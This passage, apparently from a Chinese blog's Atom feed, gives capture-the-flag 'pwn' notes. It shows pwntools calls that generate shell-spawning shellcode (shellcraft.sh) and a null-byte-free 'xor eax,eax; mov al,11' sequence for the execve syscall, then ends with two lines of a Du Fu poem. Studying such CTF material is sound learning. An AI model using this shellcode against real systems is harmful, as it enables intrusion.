class="line">ipython</div><div class="line">from pwn <span class="keyword">import</span> *</div><div class="line">print shellcraft.sh()</div><div class="line"></div><div class="line">print shellcraft.syscall(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>)</div><div class="line">asm('mov eax,11')</div></pre></td></tr></table></figure></p><p>这里的<code>\x00\x00\x00</code>坏字符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">asm(&apos;&apos;&apos;</div><div class="line">xor eax,eax</div><div class="line">mov al,11</div><div class="line">&apos;&apos;&apos;)</div></pre></td></tr></table></figure></p><p><code>lay asm</code></p><h3 id="文学修养"><a href="#文学修养" class="headerlink" title="文学修养"></a>文学修养</h3><p>无边落木萧萧下，不尽长江滚滚来。<br>万里悲秋常作客，百年多病独登台。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pwn题必备的套路&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
